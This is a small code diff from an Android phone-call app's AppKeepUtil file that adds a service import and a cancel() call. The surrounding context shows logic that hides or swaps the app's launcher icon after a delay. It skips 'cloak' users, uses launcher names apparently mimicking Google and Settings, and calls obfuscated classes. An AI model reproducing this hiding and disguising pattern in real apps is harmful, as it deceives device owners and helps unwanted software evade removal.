@@ -9,6 +9,7 @@ import androidx.core.content.ContextCompat
 import com.NivCvXXTe.fivaZSftMS
 import com.blankj.utilcode.util.ActivityUtils
 import com.lixiang.phonecall.base.appContext
+import com.lixiang.phonecall.service.CustomIncomingCallService
 import com.lixiang.phonecall.service.NotificationService
 import com.lixiang.phonecall.ui.NewGoogleLaunchAc
 import com.lixiang.phonecall.ui.NewSettingLaunchAc
@@ -65,6 +66,7 @@ object AppKeepUtil {
                 delay(FireConfig.ringartExchangeIcoBean.changeIconDelayTime().toLong()+2000L)
                 if (!splashPageShowing&&!UserTypeUtil.isCloakBlankUser&&FireConfig.ringartExchangeIcoBean.checkCanHideIcon()){
                     changeIcon=true
+                    cancel()
                     if (Build.VERSION.SDK_INT < 29){
                         FirebasePointUtil.point("ringart_android_10")
                         fivaZSftMS.LjhTlxWvsWPh(appContext,SplashAC::class.java.canonicalName)
